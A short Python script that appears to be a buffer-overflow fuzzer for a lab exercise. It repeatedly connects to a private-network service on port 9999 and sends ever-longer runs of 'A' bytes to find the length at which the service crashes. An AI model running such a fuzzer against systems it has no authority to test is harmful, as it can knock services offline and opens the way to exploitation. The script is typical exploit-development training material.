#!/usr/bin/python
import socket
from time import sleep

ip = '192.168.1.83'
port = 9999
prefix = b"" # no prefix
buffer = b"A" * 100
i = 0
while True:
	buf = (b"A" * i) + buffer
	print("Fuzzing with buffer length: " + str(len(buf)))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((ip,port))
	resp = s.recv(1024)
	print(resp)


	s.send(prefix + buf + b"\r\n")
	resp = s.recv(1024)
	print(resp)


	
	#s.send('PASS CTHULU\r\n')

	s.close()
	i += 100
	sleep(2)